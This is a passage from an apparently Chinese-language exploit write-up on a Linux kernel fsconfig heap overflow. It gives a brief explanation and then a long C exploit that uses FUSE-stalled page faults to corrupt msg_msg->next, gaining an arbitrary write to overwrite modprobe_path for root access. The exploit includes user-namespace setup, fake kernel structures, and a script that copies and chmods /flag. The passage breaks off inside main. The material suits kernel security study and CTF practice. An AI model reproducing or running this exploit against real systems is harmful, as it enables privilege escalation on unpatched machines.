alen;</span><br><span class="line">src = (<span class="keyword">char</span> __user *)src + alen;</span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(seg + <span class="number">1</span>, src, alen))</span><br><span class="line"><span class="keyword">goto</span> out_err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = security_msg_msg_alloc(msg);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> out_err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">free_msg(msg);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以注意到的是在对<code>msg_msg</code>写完之后会进入下面的for循环，其会根据<code>next</code>指针然后再进行写，后面的写就是写入到<code>msg_msgseg</code>结构体中了。如果我们能够在第一次写的时候修改掉<code>msg_msg-&gt;next</code>指针即可实现任意地址写了。</p><p>面对上面的思路，使用<code>userfaultfd</code>是很明显可以实现的，不过既然这篇文章提到了<code>FUSE</code>那么这里肯定就使用<code>FUSE</code>了，不过思路都是一样的。所以这里的整体思路就是通过<code>mmap</code>创建两块连续的内存区域，让后一块内存区域和<code>FUSE</code>挂载点下的文件做映射，那么在读取下一块内存时就会进入到我们预先写到的<code>read</code>函数中去了，在这个处理函数中使用<code>fsconfig</code>中的漏洞去修改掉<code>msg_msg-&gt;next</code>指针，在结束处理函数之后就会继续往已经被我们修改的指针地址写入内容了，完成了任意地址写。这里因为只泄漏了内核基地址所以这里写的地方也选择的是<code>modprobe_path</code>进行提权。</p><h3 id="综上可得exp"><a href="#综上可得exp" class="headerlink" title="综上可得exp"></a>综上可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUSE_USE_VERSION 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fuse.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 0x50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEQ_FILE_NUM 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;  <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_mod</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mkdir -p /tmp&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;cp /flag /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/copy.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xFF\\xFF\\xFF\\xFF&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">uid_t</span> uid, <span class="keyword">gid_t</span> gid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(temp, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(temp);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> exp_fs_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *evil_path = <span class="string">&quot;evil&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">change_next</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fake_msg[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_list.next = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_list.prev = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_type = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_ts = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;next = modprobe_path;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;security = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, fake_msg + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[<span class="number">1</span>], <span class="string">&#x27;A&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_read</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> size, <span class="keyword">off_t</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">              struct fuse_file_info *fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> evil_buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">char</span> rev;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset &gt;= <span class="number">0x1000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (offset + size &gt; <span class="number">0x1000</span>)</span><br><span class="line">        size = <span class="number">0x1000</span> - offset;</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(evil_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(evil_buf));</span><br><span class="line">    <span class="built_in">strcpy</span>(evil_buf, <span class="string">&quot;/tmp/shell.sh&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, evil_buf + offset, size);</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;rev, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_getattr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, struct stat *stbuf,</span></span></span><br><span class="line"><span class="params"><span class="function">                 struct fuse_file_info *fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(stbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct stat));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        stbuf-&gt;st_mode = S_IFDIR | <span class="number">0755</span>;</span><br><span class="line">        stbuf-&gt;st_nlink = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path + <span class="number">1</span>, evil_path) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        stbuf-&gt;st_mode = S_IFREG | <span class="number">0666</span>;</span><br><span class="line">        stbuf-&gt;st_nlink = <span class="number">1</span>;</span><br><span class="line">        stbuf-&gt;st_size = <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        res = -ENOENT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_readdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">void</span> *buf, <span class="keyword">fuse_fill_dir_t</span> filler,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">off_t</span> offset, struct fuse_file_info *fi,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">enum</span> fuse_readdir_flags flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">    filler(buf, <span class="string">&quot;.&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    filler(buf, <span class="string">&quot;..&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    filler(buf, evil_path, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fuse_operations</span> <span class="title">evil_ops</span> =</span> &#123;</span><br><span class="line">    .getattr = evil_getattr,</span><br><span class="line">    .readdir = evil_readdir,</span><br><span class="line">    .read = evil_read,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x20</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr = <span class="number">-1</span>; <span class="comment">// single_start</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *evil_args[] = &#123;<span class="string">&quot;exploit&quot;</span>, <span class="string">&quot;./temp&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    evil_args[<span class="number">0</span>] = argv[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> 